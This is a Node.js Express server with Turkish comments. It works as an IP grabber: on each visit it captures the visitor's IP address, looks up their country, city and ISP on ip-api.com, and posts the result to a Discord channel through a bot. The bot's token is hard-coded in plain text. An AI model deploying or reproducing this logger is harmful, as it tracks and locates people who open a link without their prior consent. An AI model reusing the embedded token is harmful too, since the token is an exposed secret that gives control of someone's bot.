const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

// Discord bot ayarları
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const DISCORD_TOKEN = 'MTI3NjU0NzUzMTExNDk0MjUxNQ.GDsqOZ.1zWsQCwpA5xyDVG-EBW3loTlaiOOE2hI3WLg9Y';
const CHANNEL_ID = '1276548997074391112';

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.login(DISCORD_TOKEN);

// Express sunucu ayarları
const app = express();
const PORT = process.env.PORT || 3000;

// Kullanıcının IP'sini almak ve Discord'a göndermek
app.get('/', async (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ipInfoUrl = `http://ip-api.com/json/${userIP}`;

    try {
        const response = await axios.get(ipInfoUrl);
        const ipInfo = response.data;

        // Embed mesaj oluşturma
        const embed = new EmbedBuilder()
            .setTitle('Yeni IP Tespiti')
            .addFields(
                { name: 'IP Adresi', value: ipInfo.query, inline: true },
                { name: 'Ülke', value: ipInfo.country, inline: true },
                { name: 'Şehir', value: ipInfo.city, inline: true },
                { name: 'ISP', value: ipInfo.isp, inline: true },
            )
            .setTimestamp();

        // Discord'a gönderme
        const channel = await client.channels.fetch(CHANNEL_ID);
        channel.send({ embeds: [embed] });

        res.send('IP bilgileri Discord sunucusuna gönderildi.');
    } catch (error) {
        console.error('IP bilgilerini alırken hata:', error);
        res.status(500).send('Bir hata oluştu.');
    }
});

app.listen(PORT, () => {
    console.log(`Sunucu http://localhost:${PORT} adresinde çalışıyor.`);
});
